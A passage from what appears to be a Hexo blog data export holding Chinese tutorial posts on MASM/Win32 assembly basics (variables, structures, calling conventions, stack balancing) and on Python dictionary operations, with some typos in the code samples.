class=\"code\"><pre><span class=\"line\">addr 局部变量/全局变量</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04-参数传递与堆栈平衡\"><a href=\"#0x04-参数传递与堆栈平衡\" class=\"headerlink\" title=\"0x04 参数传递与堆栈平衡\"></a>0x04 参数传递与堆栈平衡</h4><p>我们知道，参数是通过栈来传递的，那么完成函数调用后，参数就已经没有作用了，因此要把栈恢复到压入参数前的状态，这个过程就是堆栈平衡。</p>\n<p>参数传递约定：</p>\n<blockquote>\n<ul>\n<li>C与Stdcall采用从右往左开始压入栈中。</li>\n</ul>\n</blockquote>\n<p>平衡堆栈：</p>\n<blockquote>\n<ul>\n<li>C由调用者平衡堆栈。</li>\n<li>Stdcall由被调用者平衡堆栈。</li>\n</ul>\n</blockquote>\n<p>Win32使用Stdcall调用约定。</p>\n<p><strong>C调用方式：</strong></p>\n<p>子程序定义及调用（传入参数：1、2）：            <img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401154311.png\" alt>                     </p>\n<p>编译子程序后再反汇编：</p>\n<p><img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401154931.png\" alt>      </p>\n<p><img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401155014.png\" alt></p>\n<ul>\n<li>可以看到参数<code>2</code>先被压入栈中，然后才压入<code>1</code>，即从右到左。</li>\n<li>而平衡堆栈是在call之后使用<code>add esp,0000008</code>，因此是调用者平衡的堆栈。</li>\n</ul>\n<p><strong>Stdcal调用方式：</strong></p>\n<p>子程序定义及调用（传入参数：1、2）： </p>\n<p><img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401155645.png\" alt></p>\n<p>编译子程序后再反汇编：</p>\n<p><img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401155758.png\" alt></p>\n<p><img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401155812.png\" alt></p>\n<ul>\n<li>可以看到参数<code>2</code>先被压入栈中，然后才压入<code>1</code>，即从右到左。</li>\n<li>但平衡堆栈是在子程序中使用了<code>ret 0008</code>，即被调用者平衡的堆栈。</li>\n</ul>\n<blockquote>\n<p>ret指令后加一个操作数表示，在ret后，使用esp+操作数。</p>\n</blockquote>\n<h4 id=\"0x05-完整的栈操作过程\"><a href=\"#0x05-完整的栈操作过程\" class=\"headerlink\" title=\"0x05 完整的栈操作过程\"></a>0x05 完整的栈操作过程</h4><p>设最初的栈状态为esp。</p>\n<p>首先，调用函数并传入参数<code>invoke 函数名,参数1,参数2</code>：</p>\n<ul>\n<li>将两个参数依次压入栈中：<ul>\n<li><code>push 参数2</code></li>\n<li><code>push 参数1</code></li>\n<li>此时esp-4-4。</li>\n</ul>\n</li>\n<li>然后<code>call  函数定义地址</code>。<ul>\n<li>将此时的EIP压入栈中：<code>push eip</code><ul>\n<li>此时esp-8-4</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>进入函数内部执行函数：</p>\n<ul>\n<li>保存当前ebp的数据：<code>push ebp</code><ul>\n<li>此时esp-12-4。</li>\n</ul>\n</li>\n<li>将当前esp的值给ebp：<code>mov ebp,esp</code></li>\n<li>为局部变量留空间：<code>add esp,fffffff8</code><ul>\n<li>此时esp-16-8</li>\n</ul>\n</li>\n<li>使用ebp获取参数、局部变量。</li>\n<li>销毁局部变量：<code>leave</code><ul>\n<li>恢复esp状态到为局部变量留空间前：<code>mov esp,ebp</code><ul>\n<li>此时esp-24+8</li>\n</ul>\n</li>\n<li>恢复ebp：<code>pop ebp</code><ul>\n<li>此时esp-16+4</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>函数返回：<code>ret 8</code><ul>\n<li><code>add esp,8</code><ul>\n<li>此时esp-12+8</li>\n</ul>\n</li>\n<li><code>pop eip</code><ul>\n<li>此时esp-4+4。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h4 id=\"0x00-全局变量\"><a href=\"#0x00-全局变量\" class=\"headerlink\" title=\"0x00 全局变量\"></a>0x00 全局变量</h4><p>全局变量的作用域是整个程序。</p>\n<p>全局变量在<code>.data</code>或<code>.data?</code>段中定义。在<code>.data</code>段中定义变量时可以指定初值，也可以用<code>?</code>表示预留。在<code>.data?</code>段中定义变量时不能初始化值，只能使用<code>?</code>预留空间。使用<code>?</code>时，编译器实际是用0替代的。</p>\n<p>可以同时定义变量的类型和长度。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">变量名  类型  初始值1，初始值2...</span><br><span class=\"line\">变量名  类型  重复数量 dup(初始值1,初始值2...)</span><br></pre></td></tr></table></figure>","more":"<p>常用类型：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db  定义字节类型，1B。</span><br><span class=\"line\">dw  定义字类型，2B。</span><br><span class=\"line\">dd  定义双字类型，4B。</span><br><span class=\"line\">df  定义三字类型，6B。</span><br><span class=\"line\">dq  定义四字类型，8B。</span><br><span class=\"line\"></span><br><span class=\"line\">;注意，只有在定义全局变量的时候才能使用类型的简写。</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x01-局部变量\"><a href=\"#0x01-局部变量\" class=\"headerlink\" title=\"0x01 局部变量\"></a>0x01 局部变量</h4><p>局部变量的作用域只在当前子程序中。</p>\n<p>局部变量存储在栈空间中。</p>\n<p>局部变量定义在子程序定义位置的proc之后，子程序内部其他指令前。</p>\n<p>局部变量名不能与全局变量名同名。</p>\n<p>局部变量定义时不能直接初始化值，因为local伪指令的作用只是预留相应的栈空间给局部变量。</p>\n<p>局部变量定义：</p>\n<p>MASM提供的伪指令local定义局部变量。</p>\n<p>格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local 变量名 [[重复数量]] [:类型]</span><br></pre></td></tr></table></figure>\n<p>类型有：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">:数据结构名   ;数据结构</span><br><span class=\"line\">:byte       ;字节型</span><br><span class=\"line\">:word       ;字型</span><br><span class=\"line\">:dword      ;双字型,默认就是dw，所以可以省略.</span><br></pre></td></tr></table></figure>\n<p><strong>局部变量也存储在堆栈中，进入（执行）子程序时，会修改堆栈指针ESP来预留给局部变量的空间。</strong></p>\n<p>例子：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TestPro proc                   ;定义一个子程序</span><br><span class=\"line\"></span><br><span class=\"line\">local str1:dword,str2:word     ;定义两个变量，str1时双字型，str2是字型。</span><br><span class=\"line\">local str3:byte                ;定义一个变量，str3是字节型。</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,str1</span><br><span class=\"line\">mov bx,str2</span><br><span class=\"line\">mov cl,str3</span><br><span class=\"line\">ret </span><br><span class=\"line\"></span><br><span class=\"line\">TestPro proc endp  ;子程序结束</span><br></pre></td></tr></table></figure>\n<p>将上面代码进行编译然后再反汇编得到：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push ebp              ;先保存ebp寄存器的原始值。</span><br><span class=\"line\">mov  ebp,esp          ;将此时的esp指针地址给ebp。</span><br><span class=\"line\">add  esp,FFFFFFF8     ;调整esp以预留局部变量所需的空间，上面程序定义的局部变量共需7B,但预留了8B，是因为esp操作都是按dword,就像sp都是+2或-2一样。</span><br><span class=\"line\">                      ;FFFFFFF8是-8,之所以是-8是因为栈是由大往小开始的。</span><br><span class=\"line\"></span><br><span class=\"line\">mov  eax,dword ptr [ebp-4]    ;在[ebp-4]内存单元取双字数据（4byte）给eax</span><br><span class=\"line\">mov bx,word ptr [ebp-6]       ;在[ebp-6]内存单元取字数据（2byte）给bx</span><br><span class=\"line\">mov cl,byte ptr [ebp-7]       ;在[ebp-7]内存单元取字数据（2byte）给cl</span><br><span class=\"line\"></span><br><span class=\"line\">leave    ;等同于：mov esp,ebp 、 pop ebp</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<ul>\n<li>注意：ebp之后没有任何更改，而是作为一个参考点。ebp指向压入局部变量之前的栈顶元素。</li>\n</ul>\n<h4 id=\"0x02-数据结构\"><a href=\"#0x02-数据结构\" class=\"headerlink\" title=\"0x02 数据结构\"></a>0x02 数据结构</h4><p>数据结构实际上是包含多个字段的模板，字段的类型可以是任意的（byte、word、dword….）</p>\n<p>定义数据结构格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">结构名 struct                例子：</span><br><span class=\"line\">                              WNDCLASS struct             </span><br><span class=\"line\">字段1  类型  ？                     str1  byte  ?</span><br><span class=\"line\">字段2  类型  ？                     str2  dword ?</span><br><span class=\"line\">   ...                        WNDCLASS ends</span><br><span class=\"line\"></span><br><span class=\"line\">结构名 ends</span><br></pre></td></tr></table></figure>\n<p>可以把数据类型当作是一种自定义类型，因此定义了数据结构后，可以使用数据结构作为创建变量类型：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data?</span><br><span class=\"line\">szWndClass  WNDCLASS  &lt;&gt;      ;未初始化值的结构。</span><br></pre></td></tr></table></figure>\n<p>或者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data</span><br><span class=\"line\">szWndClass  WNDCLASS  &lt;1,2&gt;    ;结构的两个字段分别赋值1,2</span><br></pre></td></tr></table></figure>\n<p>PS：这样来看定义的结构类似于类，利用结构定义的变量类似于类的实例。</p>\n<p>数据结构的字段访问：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">szWndClass.str1</span><br><span class=\"line\">szWndClass.str2</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x03-变量访问\"><a href=\"#0x03-变量访问\" class=\"headerlink\" title=\"0x03 变量访问\"></a>0x03 变量访问</h4><p>在MASM中，如果要以变量类型长度以外的长度去访问变量，必须要显式的指明访问长度。（否则操作的寄存器与变量类型长度不一致时，将会报错）</p>\n<p>方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">类型  ptr 变量名</span><br></pre></td></tr></table></figure>\n<p>避免寄存器长度与变量类型长度不一致，可以使用movz指令。</p>\n<p>变量尺寸或数据项数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sizeof    变量/数据类型/数据结构      ;取得字节数。</span><br><span class=\"line\">lengthof  变量/数据类型/数据结构      ;变量中的数据项数。</span><br></pre></td></tr></table></figure>\n<p>获取变量地址：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">offset 变量名</span><br></pre></td></tr></table></figure>\n<p>offset只能用于全局变量，因为局部变量的地址在编译时是不能确定的，因此使用lea指令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lea eax,[ebp-4]    ;取得ebp-4的内存地址并存储到EAX</span><br></pre></td></tr></table></figure>\n<p>addr用于在参数时使用，addr 全局变量时，会编译成offset;addr 局部变量时，会编译为lea，但能addr的局部变量，必须是在参数中的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">addr 局部变量/全局变量</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04-参数传递与堆栈平衡\"><a href=\"#0x04-参数传递与堆栈平衡\" class=\"headerlink\" title=\"0x04 参数传递与堆栈平衡\"></a>0x04 参数传递与堆栈平衡</h4><p>我们知道，参数是通过栈来传递的，那么完成函数调用后，参数就已经没有作用了，因此要把栈恢复到压入参数前的状态，这个过程就是堆栈平衡。</p>\n<p>参数传递约定：</p>\n<blockquote>\n<ul>\n<li>C与Stdcall采用从右往左开始压入栈中。</li>\n</ul>\n</blockquote>\n<p>平衡堆栈：</p>\n<blockquote>\n<ul>\n<li>C由调用者平衡堆栈。</li>\n<li>Stdcall由被调用者平衡堆栈。</li>\n</ul>\n</blockquote>\n<p>Win32使用Stdcall调用约定。</p>\n<p><strong>C调用方式：</strong></p>\n<p>子程序定义及调用（传入参数：1、2）：            <img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401154311.png\" alt>                     </p>\n<p>编译子程序后再反汇编：</p>\n<p><img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401154931.png\" alt>      </p>\n<p><img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401155014.png\" alt></p>\n<ul>\n<li>可以看到参数<code>2</code>先被压入栈中，然后才压入<code>1</code>，即从右到左。</li>\n<li>而平衡堆栈是在call之后使用<code>add esp,0000008</code>，因此是调用者平衡的堆栈。</li>\n</ul>\n<p><strong>Stdcal调用方式：</strong></p>\n<p>子程序定义及调用（传入参数：1、2）： </p>\n<p><img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401155645.png\" alt></p>\n<p>编译子程序后再反汇编：</p>\n<p><img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401155758.png\" alt></p>\n<p><img src=\"/2019/04/01/03-win32编程基础Chapter-4/QQ截图20190401155812.png\" alt></p>\n<ul>\n<li>可以看到参数<code>2</code>先被压入栈中，然后才压入<code>1</code>，即从右到左。</li>\n<li>但平衡堆栈是在子程序中使用了<code>ret 0008</code>，即被调用者平衡的堆栈。</li>\n</ul>\n<blockquote>\n<p>ret指令后加一个操作数表示，在ret后，使用esp+操作数。</p>\n</blockquote>\n<h4 id=\"0x05-完整的栈操作过程\"><a href=\"#0x05-完整的栈操作过程\" class=\"headerlink\" title=\"0x05 完整的栈操作过程\"></a>0x05 完整的栈操作过程</h4><p>设最初的栈状态为esp。</p>\n<p>首先，调用函数并传入参数<code>invoke 函数名,参数1,参数2</code>：</p>\n<ul>\n<li>将两个参数依次压入栈中：<ul>\n<li><code>push 参数2</code></li>\n<li><code>push 参数1</code></li>\n<li>此时esp-4-4。</li>\n</ul>\n</li>\n<li>然后<code>call  函数定义地址</code>。<ul>\n<li>将此时的EIP压入栈中：<code>push eip</code><ul>\n<li>此时esp-8-4</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>进入函数内部执行函数：</p>\n<ul>\n<li>保存当前ebp的数据：<code>push ebp</code><ul>\n<li>此时esp-12-4。</li>\n</ul>\n</li>\n<li>将当前esp的值给ebp：<code>mov ebp,esp</code></li>\n<li>为局部变量留空间：<code>add esp,fffffff8</code><ul>\n<li>此时esp-16-8</li>\n</ul>\n</li>\n<li>使用ebp获取参数、局部变量。</li>\n<li>销毁局部变量：<code>leave</code><ul>\n<li>恢复esp状态到为局部变量留空间前：<code>mov esp,ebp</code><ul>\n<li>此时esp-24+8</li>\n</ul>\n</li>\n<li>恢复ebp：<code>pop ebp</code><ul>\n<li>此时esp-16+4</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>函数返回：<code>ret 8</code><ul>\n<li><code>add esp,8</code><ul>\n<li>此时esp-12+8</li>\n</ul>\n</li>\n<li><code>pop eip</code><ul>\n<li>此时esp-4+4。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>"},{"title":"Python基础学习系列Chapter 4：字典","date":"2019-03-19T08:12:43.000Z","_content":"\n### 0x00 字典概述\n\n- 任意对象的无序集合\n- 可任意嵌套\n- 属于可变类型对象 \n- 字典存储0个或多个对象的引用\n- 通过key而不是下标取值，且key具有唯一性\n\n<!-- more -->\n\n### 0x01 字典创建\n\n```python\ndic = {}\ndic = {'name':'opaque','job':'hacker'}\ndic = dict(name='opaque',job=\"hacker\")\n```\n\n### 0x02 字典操作\n\n#### **查相关**\n\n##### 索引键\n\n```python\ndic = {'name':'opaque','job':{'IT':hacker'}}\n\ndic['name']        #索引key为name对应的值，返回'opaque'\ndic['job']['IT']   #索引嵌套的内容，返回'hacker'\n```\n\n##### get() #根据键返回值\n\n```python\ndic.get('name')\ndic.get('job').get('IT')\ndic.get('other','abc')     #不存在‘other’键时，返回‘abc’\n```\n\n- get()与索引的区别在于，索引不存在的键时会引发异常错误，而get()不存在的键时，默认会返回NONE，也可自己设置（如上面第三个栗子）。\n\n##### in #成员关系测试\n\n```python\ndic = {'name':'opaque','job':{'IT':hacker'}}\n\n'name' in dic     #测试字典是否存在key'name'\n```\n\n##### items() #列出所有键值对\n\n```python\ndic.items()\n```\n\n- 返回的结果是形似以元组为元素的列表的可迭代对象\n\n##### keys() #列出所有键名列表\n\n```python\ndic.keys()\n```\n\n- 返回形似列表的可迭代对象\n\n##### value() #列出所有值列表\n\n```python\ndic.values()\n```\n\n- 返回形似列表的可迭代对象\n\n#### **增相关**\n\n##### 赋值\n\n```python\ndic={}\n\ndic['age']=18                 #新增一个key为'age',value为18\ndic['other']={'sex':'man'}    #嵌套赋值\n```\n\n- 已有则修改，无则新增\n\n##### update() #合并字典\n\n```python\ndic1 = {'name':'opaque'}\ndic2 = {'job':'hacker'}\n\ndic1.update(dic2)      #将dic2合并至dic1\n```\n\n##### setdefault() #增或查\n\n```python\ndic = {'name':'opaque'}\ndic.setdefault('name',18)               #已存在key'name',直接返回value'opaque'\ndic.setdefault('age',18)                #新增\ndic.setdefault('job',{'IT':'hacker'})   #新增\n```\n\n- 字典中已经存该key名，则返回对应的value，若key不存在，则插入key以及value。\n\n#### **改相关**\n\n##### 赋值修改\n\n```python\ndic={'job':'hacker'}\n\ndic['job']='HACKER'\n```\n\n#### **删相关**\n\n##### pop() #删除指定key的项\n\n```python\ndic = {'name':'opaque','job':'hacker'}\n\ndic.pop('name')\n```\n\n- 与列表的pop()差不多，会返回删除的key对应的value\n\n##### popitem() #随意删除一个项\n\n```python\ndic.popitem()\n```\n\n- 返回以被删除的键值作为元素的元组\n\n##### del\n\n```python\ndic = {'name':'opaque','job':'hacker'}\n\ndel dic['name']\n```\n\n#### **其他**\n\n##### fromkeys() #初始化一个字典\n\n```python\ndic = fromekeys(['name','age'])             #创建一个字典，key分别为'name'、'age',value都为NONE\ndic = fromekeys(('name','age'),'opaque')    #value都为'opaque'\n```\n\n- 第一个参数为序列对象，序列中的元素作为key\n- 第二个参数为value，序列中的全部key共享引用该value。\n- 注意该value不要在嵌套，否则引用会有问题：\n\n```python\ndic = fromekeys(('name','age'),{'a':'opaque'})\n\ndic[name]['a']=2     #会导致age的a的值也会变，因为共享引用\n```\n\n#### **字典遍历**\n\n##### 三种方法\n\n```python\ndic = {'name':'opaque','job':'hacker'}\n\nfor k in dic:\n    print(k,dic[k])\n    \nfor k,v in dic.items():\n    print(k,v)\n    \nfor k in dic.keys():\n    print(k,dic[k])\n\n```\n\n- 优先第一种，第一种比第二种效率高，第二种有类型转换的过程。\n\n#### 二次总结\n\n```python\n1.字典是任意对象的无序集合。\n2.字典以键值对的方式存储。\n3.字典是可以原处修改的对象，存储的是对象的引用。\n4.强制类型转换：dict()\n5.常量：\n\tdict={'k1':'v1'}\n6.操作：\n\t查：\n\t\t索引通过键索引，而不是下标：dict['key']\n\t\tget() #根据键返回值,对比索引差别在于取不存在的键不会报错。\n\t\titems()  #列出所有键值对\n\t\tkeys()   #列出所有键名列表\n\t\tvalues() #列出所有值列表\n\t\t\n\t增：\n\t\t索引不存在的键并赋值是新增一个元素。\n\t\tupdate() #用一个字典新增到另一个字典中。（原处修改，同列表的extend()）\n\t\t\n\t改：\n\t\t索引已存在的键并赋新值是修改。\n\t\n\t删：\n\t\tpop()  #删除指定key的项并返回值。（原处修改）\n\t\tpopitem() #随意删除一个项并返回键值。（原处修改）\n\t\tclear()\t #清空字典\n\t\tdel dict['key'] #删除索引。（原处修改）\n\t\t\n6.遍历字典：\n\t\tfor k in dict:\n\t\t\t print(k,dict['k'])\n\t\t\n\t\tfor k,v in dict.items():\n\t\t\tprint(k,v)\n\t\t\t\n\t\tfor k in dict.keys():\n\t\t\tprint(k,dict['k'])\n\n```\n\n","source":"_posts/03python基础学习系列之字典.md","raw":"---\ntitle: Python基础学习系列Chapter 4：字典\ndate: 2019-03-19 16:12:43\ntags:\n\t- Python基础\n\t- Language\ncategories: Python\n---\n\n### 0x00 字典概述\n\n- 任意对象的无序集合\n- 可任意嵌套\n- 属于可变类型对象 \n- 字典存储0个或多个对象的引用\n- 通过key而不是下标取值，且key具有唯一性\n\n<!-- more -->\n\n### 0x01 字典创建\n\n```python\ndic = {}\ndic = {'name':'opaque','job':'hacker'}\ndic = dict(name='opaque',job=\"hacker\")\n```\n\n### 0x02 字典操作\n\n#### **查相关**\n\n##### 索引键\n\n```python\ndic = {'name':'opaque','job':{'IT':hacker'}}\n\ndic['name']        #索引key为name对应的值，返回'opaque'\ndic['job']['IT']   #索引嵌套的内容，返回'hacker'\n```\n\n##### get() #根据键返回值\n\n```python\ndic.get('name')\ndic.get('job').get('IT')\ndic.get('other','abc')     #不存在‘other’键时，返回‘abc’\n```\n\n- get()与索引的区别在于，索引不存在的键时会引发异常错误，而get()不存在的键时，默认会返回NONE，也可自己设置（如上面第三个栗子）。\n\n##### in #成员关系测试\n\n```python\ndic = {'name':'opaque','job':{'IT':hacker'}}\n\n'name' in dic     #测试字典是否存在key'name'\n```\n\n##### items() #列出所有键值对\n\n```python\ndic.items()\n```\n\n- 返回的结果是形似以元组为元素的列表的可迭代对象\n\n##### keys() #列出所有键名列表\n\n```python\ndic.keys()\n```\n\n- 返回形似列表的可迭代对象\n\n##### value() #列出所有值列表\n\n```python\ndic.values()\n```\n\n- 返回形似列表的可迭代对象\n\n#### **增相关**\n\n##### 赋值\n\n```python\ndic={}\n\ndic['age']=18                 #新增一个key为'age',value为18\ndic['other']={'sex':'man'}    #嵌套赋值\n```\n\n- 已有则修改，无则新增\n\n##### update() #合并字典\n\n```python\ndic1 = {'name':'opaque'}\ndic2 = {'job':'hacker'}\n\ndic1.update(dic2)      #将dic2合并至dic1\n```\n\n##### setdefault() #增或查\n\n```python\ndic = {'name':'opaque'}\ndic.setdefault('name',18)               #已存在key'name',直接返回value'opaque'\ndic.setdefault('age',18)                #新增\ndic.setdefault('job',{'IT':'hacker'})   #新增\n```\n\n- 字典中已经存该key名，则返回对应的value，若key不存在，则插入key以及value。\n\n#### **改相关**\n\n##### 赋值修改\n\n```python\ndic={'job':'hacker'}\n\ndic['job']='HACKER'\n```\n\n#### **删相关**\n\n##### pop() #删除指定key的项\n\n```python\ndic = {'name':'opaque','job':'hacker'}\n\ndic.pop('name')\n```\n\n- 与列表的pop()差不多，会返回删除的key对应的value\n\n##### popitem() #随意删除一个项\n\n```python\ndic.popitem()\n```\n\n- 返回以被删除的键值作为元素的元组\n\n##### del\n\n```python\ndic = {'name':'opaque','job':'hacker'}\n\ndel dic['name']\n```\n\n#### **其他**\n\n##### fromkeys() #初始化一个字典\n\n```python\ndic = fromekeys(['name','age'])             #创建一个字典，key分别为'name'、'age',value都为NONE\ndic = fromekeys(('name','age'),'opaque')    #value都为'opaque'\n```\n\n- 第一个参数为序列对象，序列中的元素作为key\n- 第二个参数为value，序列中的全部key共享引用该value。\n- 注意该value不要在嵌套，否则引用会有问题：\n\n```python\ndic = fromekeys(('name','age'),{'a':'opaque'})\n\ndic[name]['a']=2     #会导致age的a的值也会变，因为共享引用\n```\n\n#### **字典遍历**\n\n##### 三种方法\n\n```python\ndic = {'name':'opaque','job':'hacker'}\n\nfor k in dic:\n    print(k,dic[k])\n    \nfor k,v in dic.items():\n    print(k,v)\n    \nfor k in dic.keys():\n    print(k,dic[k])\n\n```\n\n- 优先第一种，第一种比第二种效率高，第二种有类型转换的过程。\n\n#### 二次总结\n\n```python\n1.字典是任意对象的无序集合。\n2.字典以键值对的方式存储。\n3.字典是可以原处修改的对象，存储的是对象的引用。\n4.强制类型转换：dict()\n5.常量：\n\tdict={'k1':'v1'}\n6.操作：\n\t查：\n\t\t索引通过键索引，而不是下标：dict['key']\n\t\tget() #根据键返回值,对比索引差别在于取不存在的键不会报错。\n\t\titems()  #列出所有键值对\n\t\tkeys()   #列出所有键名列表\n\t\tvalues() #列出所有值列表\n\t\t\n\t增：\n\t\t索引不存在的键并赋值是新增一个元素。\n\t\tupdate() #用一个字典新增到另一个字典中。（原处修改，同列表的extend()）\n\t\t\n\t改：\n\t\t索引已存在的键并赋新值是修改。\n\t\n\t删：\n\t\tpop()  #删除指定key的项并返回值。（原处修改）\n\t\tpopitem() #随意删除一个项并返回键值。（原处修改）\n\t\tclear()\t #清空字典\n\t\tdel dict['key'] #删除索引。（原处修改）\n\t\t\n6.遍历字典：\n\t\tfor k in dict:\n\t\t\t print(k,dict['k'])\n\t\t\n\t\tfor k,v in dict.items():\n\t\t\tprint(k,v)\n\t\t\t\n\t\tfor k in dict.keys():\n\t\t\tprint(k,dict['k'])\n\n```\n\n","slug":"03python基础学习系列之字典","published":1,"updated":"2019-03-29T07:21:13.452Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83jt000r7or0phsbza39","content":"<h3 id=\"0x00-字典概述\"><a href=\"#0x00-字典概述\" class=\"headerlink\" title=\"0x00 字典概述\"></a>0x00 字典概述</h3><ul>\n<li>任意对象的无序集合</li>\n<li>可任意嵌套</li>\n<li>属于可变类型对象 </li>\n<li>字典存储0个或多个对象的引用</li>\n<li>通过key而不是下标取值，且key具有唯一性</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"0x01-字典创建\"><a href=\"#0x01-字典创建\" class=\"headerlink\" title=\"0x01 字典创建\"></a>0x01 字典创建</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;&#125;</span><br><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:<span class=\"string\">'hacker'</span>&#125;</span><br><span class=\"line\">dic = dict(name=<span class=\"string\">'opaque'</span>,job=<span class=\"string\">\"hacker\"</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x02-字典操作\"><a href=\"#0x02-字典操作\" class=\"headerlink\" title=\"0x02 字典操作\"></a>0x02 字典操作</h3><h4 id=\"查相关\"><a href=\"#查相关\" class=\"headerlink\" title=\"查相关\"></a><strong>查相关</strong></h4><h5 id=\"索引键\"><a href=\"#索引键\" class=\"headerlink\" title=\"索引键\"></a>索引键</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'opaque'</span>,<span class=\"string\">'job'</span>:&#123;<span class=\"string\">'IT'</span>:hacke<span class=\"string\">r'&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">dic['</span>name<span class=\"string\">']        #索引key为name对应的值，返回'</span>opaque<span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">dic['</span>jo<span class=\"string\">b']['</span>IT<span class=\"string\">']   #索引嵌套的内容，返回'</span>hacke<span class=\"string\">r'</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"get-根据键返回值\"><a href=\"#get-根据键返回值\" class=\"headerlink\" title=\"get() #根据键返回值\"></a>get() #根据键返回值</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dic.get(<span class=\"string\">'name'</span>)</span><br><span class=\"line\">dic.get(<span class=\"string\">'job'</span>).get(<span class=\"string\">'IT'</span>)</span><br><span 